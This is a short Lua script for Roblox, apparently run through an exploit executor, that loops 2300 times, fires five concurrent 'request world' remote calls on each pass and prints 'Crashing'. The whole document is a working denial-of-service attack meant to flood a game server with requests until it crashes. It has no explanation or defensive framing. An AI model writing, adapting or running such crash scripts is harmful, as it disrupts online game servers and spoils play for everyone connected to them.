local lib = require(game.ReplicatedStorage.Framework.Library)
spawn(function()
    for i=1,2300  do
        print("Crashing")
        task.spawn(lib.Network.Invoke, 'request world', 'Fantasy')
        task.spawn(lib.Network.Invoke, 'request world', 'Tech')
        task.spawn(lib.Network.Invoke, 'request world', 'Void')
        task.spawn(lib.Network.Invoke, 'request world', 'Axolotl')
        task.spawn(lib.Network.Invoke, 'request world', 'Pixel')
            
      end
  end)
